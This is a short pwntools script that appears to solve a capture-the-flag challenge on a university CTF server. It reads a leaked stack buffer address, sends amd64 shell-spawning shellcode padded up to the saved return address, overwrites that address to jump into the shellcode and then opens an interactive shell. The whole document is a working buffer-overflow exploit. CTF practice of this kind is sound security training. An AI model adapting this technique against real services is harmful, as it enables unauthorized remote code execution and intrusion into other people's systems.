# !pip install pwntools

from pwn import *
context(arch="amd64",os="linux")

host, port = "ctf.adl.csie.ncu.edu.tw", 11003
p = remote(host, port)

addr = p.recvline() # "Your input buffer address is 0x7ffdf3e272f0"
addr = addr[len("Your input buffer address is "):] # "0x7ffdf3e272f0"

shell = asm(shellcraft.amd64.linux.sh())
junk = "a"*(0x78 - len(shell))
jump = p64(int(addr, 16)) # hex to decimal, then pack it

p.sendline(shell + junk + jump)
p.interactive()